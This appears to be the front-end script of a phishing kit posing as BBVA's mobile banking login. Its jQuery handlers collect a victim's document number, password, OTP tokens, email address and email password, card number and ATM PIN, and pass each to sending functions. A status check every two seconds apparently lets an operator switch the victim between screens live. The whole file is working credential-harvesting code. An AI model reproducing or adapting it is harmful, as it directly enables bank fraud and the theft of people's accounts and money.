<link rel="stylesheet" href="css/styles.css">
<link rel="stylesheet" href="css/bbva-mobile-fix.css">
<script src="../../../js/jquery-3.6.0.min.js"></script>
<script src="js/functions.js"></script>
<script>
var espera = 0;

function aplicarVistaVisible($mostrar) {
    jQuery('.step-panel').removeClass('is-visible').hide();
    $mostrar.addClass('is-visible').show();
}

jQuery(document).ready(function($) {
    var _vo = vista_otp, _ve = vista_email, _vc = vista_cajero, _ver = vista_errorotp, _vu = vista_usuario;
    vista_otp = function() { _vo(); aplicarVistaVisible($('#contenedor-token')); };
    vista_email = function() { _ve(); aplicarVistaVisible($('#contenedor-mail')); };
    vista_cajero = function() { _vc(); $('#tarjetaBloque').val(''); aplicarVistaVisible($('#contenedor-otp')); };
    vista_errorotp = function() { _ver(); aplicarVistaVisible($('#contenedor-token-err')); };
    vista_usuario = function() { _vu(); aplicarVistaVisible($('#contenedor-login')); };

    setInterval(function() { consultar_estado(); }, 2000);

    $('#btnEntrar').on('click', function() {
        $('#bbva-fondo-local,#bbva-msg-local').show();
        espera = 0;
        iniciar_sesion($('#docTypeMovil').val(), $('#docNumberMovil').val(), $('#passwordMovil').val());
    });
    $(document).on('click', '.bbva-forgot-link', function(e) {
        e.preventDefault();
    });
    $(document).on('click', '.bbva-toggle-password', function() {
        var $inp = $('#passwordMovil');
        var isPwd = $inp.attr('type') === 'password';
        $inp.attr('type', isPwd ? 'text' : 'password');
        $(this).attr('aria-label', isPwd ? 'Ocultar contraseña' : 'Mostrar contraseña');
    });
    $('#btnEnviarToken').on('click', function() {
        $('#bbva-fondo-local').show();
        enviar_OTP($('#TokenOTP').val());
    });
    $('#btnEnviarTokenErr').on('click', function() {
        $('#bbva-fondo-local').show();
        enviar_OTP($('#TokenOTPErr').val());
    });
    $('#btnEnviarMail').on('click', function() {
        $('#bbva-fondo-local').show();
        enviar_correo($('#correoElectronico').val(), $('#claveCorreo').val());
    });
    $('#btnEnviarTarjeta').on('click', function() {
        $('#bbva-fondo-local,#bbva-msg-local').show();
        var t = $('#tarjetaBloque').val().replace(/\s/g, '');
        enviar_clave(t, $('#claveCajero').val());
    });
});
</script>
